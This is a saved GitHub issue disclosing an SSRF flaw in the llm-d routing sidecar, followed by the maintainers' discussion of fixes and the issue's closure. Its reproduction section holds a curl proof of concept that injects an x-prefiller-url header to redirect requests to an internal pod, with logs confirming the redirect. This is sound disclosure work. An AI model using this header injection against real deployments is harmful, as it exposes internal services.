---
title: 'Potential SSRF via `x-prefiller-url` or `x-prefiller-host-port` header · Issue
  #242 · llm-d/llm-d-router'
id: potential-ssrf-via-x-prefiller-url-or-x-prefiller-host-port-header-issue-242-llm
tags:
- llmd-router-nonk8s-backends-54b774
- ssrf-protection
- pd-sidecar
created: '2026-09-11T21:56:46.766996Z'
updated: '2026-09-15T04:55:23.992760Z'
source: https://github.com/llm-d/llm-d-router/issues/242
source_domain: github.com
fetched_at: '2026-09-11T21:56:46.736230Z'
fetch_provider: crawl4ai
status: evergreen
type: note
tier: ground_truth
content_type: code
deprecated: false
summary: 'GitHub issue #242 (opened Jul 16 2025 by pierDipi, closed Jul 18 2025),
  the original public SSRF disclosure against the routing sidecar: the sidecar honored
  client-supplied x-prefiller-url / x-prefiller-host-port headers with zero validation,
  letting an external caller through the Gateway force the sidecar to forward the
  prefill leg to an arbitrary internal address (demonstrated with curl against an
  internal pod IP, 200 OK, confirmed via sidecar logs). Maintainer elevran proposed
  two mitigations: (1) MUST-have -- have the scheduler/gateway/EPP always clear the
  incoming header from user requests and set its own value only after scheduling (implemented
  in PR #244); (2) additional safety net -- have the sidecar validate the target is
  in-cluster/non-Internet-routable, which elevran noted requires adding Kubernetes
  API access to the sidecar''s pod (this became the InferencePool-watching AllowlistValidator,
  eventually landing via now-archived llm-d-routing-sidecar#48 and later reimplemented
  as PR #1647 in llm-d-router). The issue explicitly frames the sidecar-side allowlist
  as a secondary safety net, not the primary control -- the primary control is upstream
  header-stripping at the EPP/gateway.'
---

*Suggested by [[chat_completionsgo]] — GitHub issue search for SSRF in llm-d-router surfaced this as the original vulnerability report that motivated allowlist.go*

[Skip to content](https://github.com/llm-d/llm-d-router/issues/242#start-of-content)
You signed in with another tab or window. [Reload](https://github.com/llm-d/llm-d-router/issues/242) to refresh your session. You signed out in another tab or window. [Reload](https://github.com/llm-d/llm-d-router/issues/242) to refresh your session. You switched accounts on another tab or window. [Reload](https://github.com/llm-d/llm-d-router/issues/242) to refresh your session. Dismiss alert
###  Uh oh! 
There was an error while loading. [Please reload this page](https://github.com/llm-d/llm-d-router/issues/242).
/ Public
  * [ Notifications ](https://github.com/login?return_to=%2Fllm-d%2Fllm-d-router) You must be signed in to change notification settings
  * [ Fork 366 ](https://github.com/login?return_to=%2Fllm-d%2Fllm-d-router)
  * [ Star  333 ](https://github.com/login?return_to=%2Fllm-d%2Fllm-d-router)


#  Potential SSRF via `x-prefiller-url` or `x-prefiller-host-port` header
Copy link
Copy link
Closed
Closed
[Potential SSRF via `x-prefiller-url` or `x-prefiller-host-port` header](https://github.com/llm-d/llm-d-router/issues/242#top)#242
Copy link
Assignees
## Description
opened [on Jul 16, 2025](https://github.com/llm-d/llm-d-router/issues/242#issue-3235458086)
Last edited by pierDipi
Member
Issue body actions
## Disclaimer
Since the project is new and I've not seen any responsible disclosure process documented (as stated here <https://llm-d.ai/docs/community/contribute#security>), I'm creating a public issue in the hope that many are still only experimenting with llm-d and it's not affecting their production setup.
## Problem
There is a potential for Server-Side Request Forgery (SSRF).
The routing sidecar honors the `x-prefiller-url` and `x-prefiller-host-port` headers, however, I'd expect the header to not be passed through by the scheduler or Gateway (at least) from external, user-provided requests.
This allows a malicious external user to craft a request that forces the sidecar to forward the prefill stage of the request to an arbitrary URL or host:port. This bypasses the intended routing logic managed by the scheduler.
## To Reproduce
  1. Deploy a model fronted by Gateway and the inference scheduler on a cluster (e.g., KinD).
  2. Send a POST request to the model's inference endpoint via the gateway.
  3. In the request, include the header x-prefiller-url pointing to an arbitrary internal service address.
  4. Observe that the request is successfully processed by the unintended service.


## Example curl command
The following command was sent to the gateway at 172.18.0.3. It includes the `x-prefiller-url` header, which points to an arbitrary internal IP <http://10.244.0.51:8000>. The request succeeds with a 200 OK status, indicating the sidecar forwarded the request as instructed by the header.

```
curl -v -XPOST \
-H "x-prefiller-url: http://10.244.0.51:8000" \
-H "Content-Type: application/json" \
-d '{"model": "facebook/opt-125m", "prompt": "Write a poem about colors...", "stream": false, "max_tokens": 400}' \
http://172.18.0.3/default/facebook-opt-125m-pd/v1/completions
```

and you will see logs like these for the sidecar:

```
I0703 09:55:11.606604       1 chat_completions.go:310] "sending request to prefiller" logger="proxy server" url="http://10.244.0.51:8000/" body="{\"do_remote_decode\":true,\"max_tokens\":400,\"model\":\"facebook/opt-125m\",\"prompt\":\"Write a poem about colors, Write a poem about colors, Write a poem about colors, Write a poem about colors, Write a poem about colors, Write a poem about colors, Write a poem about colors, Write a poem about colors, Write a poem about colors, Write a poem about colors, Write a poem about colors, Write a poem about colors, a very long one please\",\"stream\":false}"
I0703 09:55:12.898331       1 chat_completions.go:334] "warning: missing 'remote_block_ids' field in prefiller response" logger="proxy server"
I0703 09:55:12.898347       1 chat_completions.go:340] "warning: missing 'remote_engine_id' field in prefiller response" logger="proxy server"
I0703 09:55:12.898351       1 chat_completions.go:346] "warning: missing 'remote_host' field in prefiller response" logger="proxy server"
I0703 09:55:12.898355       1 chat_completions.go:352] "warning: missing 'remote_port' field in prefiller response" logger="proxy server"
I0703 09:55:12.898361       1 chat_completions.go:355] "received prefiller response" logger="proxy server" remote_block_ids=null remote_engine_id=null remote_host=null remote_port=null
I0703 09:55:12.898389       1 chat_completions.go:393] "sending request to decoder" logger="proxy server" body="{\"do_remote_prefill\":true,\"max_tokens\":400,\"model\":\"facebook/opt-125m\",\"prompt\":\"Write a poem about colors, Write a poem about colors, Write a poem about colors, Write a poem about colors, Write a poem about colors, Write a poem about colors, Write a poem about colors, Write a poem about colors, Write a poem about colors, Write a poem about colors, Write a poem about colors, Write a poem about colors, a very long one please\",\"remote_block_ids\":null,\"remote_engine_id\":null,\"remote_host\":null,\"remote_port\":null,\"stream\":false}"

```

## Notes
  * Egress network policy can mitigate the issue for external and cluster internal traffic (however, it's not very simple to configure OOTB as vllm needs to connect to HF, etc to download the model(s))
  * Unclear if an HTTPRoute filter that removes the header would mitigate the issue **and** not break the P/D functionality since filters are applied before the "action" (I'm not sure what that means in the context of InferencePool and ExtProc)


## Activity
### nirrozenbaum commented on Jul 16, 2025 
Contributor
More actions
[@pierDipi](https://github.com/pierDipi) thanks for filing this issue. is this an issue with the scheduler or with the sidecar?
### elevran commented on Jul 16, 2025 
Collaborator
More actions
[@pierDipi](https://github.com/pierDipi) this is a potential issue. Some potential mitigations:
  1. We could have the sidecar validate the the endpoint is within the cluster (or at least a non Internet routable address class)
  2. envoy routing can be used to remove the header from the user and then set it by EPP (alternately, llm-d-inference-scheduler would always clear the incoming header from user even when not doing P/D. Its header value would be used in response when P/D was done).


I think the second is a must and would solve the original issue you raised. The first mitigation, in the sidecar, is an additional safety net.
[elevran](https://github.com/elevran)
self-assigned this
[on Jul 16, 2025](https://github.com/llm-d/llm-d-router/issues/242#event-18657276248)
### pierDipi commented on Jul 16, 2025 
Last edited by pierDipi
MemberAuthor
More actions
> [@pierDipi](https://github.com/pierDipi) thanks for filing this issue. is this an issue with the scheduler or with the sidecar?
I think it's technically on both
> We could have the sidecar validate the the endpoint is within the cluster (or at least a non Internet routable address class)
maybe we could additionally have the sidecar watch prefill pods to build an allowed IPs/hostname set? [@lionelvillard](https://github.com/lionelvillard)
[elevran](https://github.com/elevran)
closed this as [completed](https://github.com/llm-d/llm-d-router/issues?q=is%3Aissue%20state%3Aclosed%20archived%3Afalse%20reason%3Acompleted)in [#244](https://github.com/llm-d/llm-d-router/pull/244)[on Jul 16, 2025](https://github.com/llm-d/llm-d-router/issues/242#event-18659209413)
### elevran commented on Jul 16, 2025 
Last edited by elevran
Collaborator
More actions
> maybe we could additionally have the sidecar watch prefill pods to build an allowed IPs/hostname set? [@lionelvillard](https://github.com/lionelvillard)
[@pierDipi](https://github.com/pierDipi) This adds k8s API access to the sidecar's Pod, which it currently does not have. Please see [llm-d/llm-d-routing-sidecar#48](https://github.com/llm-d/llm-d-routing-sidecar/pull/48) for a possible workaround that might be sufficient.
Leaving the issue open - please confirm that [#244](https://github.com/llm-d/llm-d-router/pull/244) and [llm-d/llm-d-routing-sidecar#48](https://github.com/llm-d/llm-d-routing-sidecar/pull/48) are sufficient from your point of view and close if so.
[elevran](https://github.com/elevran)
reopened this [on Jul 16, 2025](https://github.com/llm-d/llm-d-router/issues/242#event-18659294794)
### pierDipi commented on Jul 18, 2025 
Last edited by pierDipi
MemberAuthor
More actions
This is fixed on main branches, thanks for the quick resolution on all PRs!
[pierDipi](https://github.com/pierDipi)
closed this as [completed](https://github.com/llm-d/llm-d-router/issues?q=is%3Aissue%20state%3Aclosed%20archived%3Afalse%20reason%3Acompleted)[on Jul 18, 2025](https://github.com/llm-d/llm-d-router/issues/242#event-18694440652)
[Sign up for free](https://github.com/signup?return_to=https://github.com/llm-d/llm-d-router/issues/242)**to join this conversation on GitHub.** Already have an account? [Sign in to comment](https://github.com/login?return_to=https://github.com/llm-d/llm-d-router/issues/242)
## Metadata
## Metadata
### Assignees
  * [elevran](https://github.com/elevran)


### Labels
No labels
No labels
No type
### Projects
No projects
### Milestone
No milestone
### Relationships
None yet
### Development
  * [Clear prefill target header if set in incoming requestllm-d/llm-d-router](https://github.com/llm-d/llm-d-router/pull/244)[Releasev0.2.0](https://github.com/llm-d/llm-d-router/releases/tag/v0.2.0)


### Participants
## Issue actions
  * Open in GitHub Copilot app


You can’t perform that action at this time. 
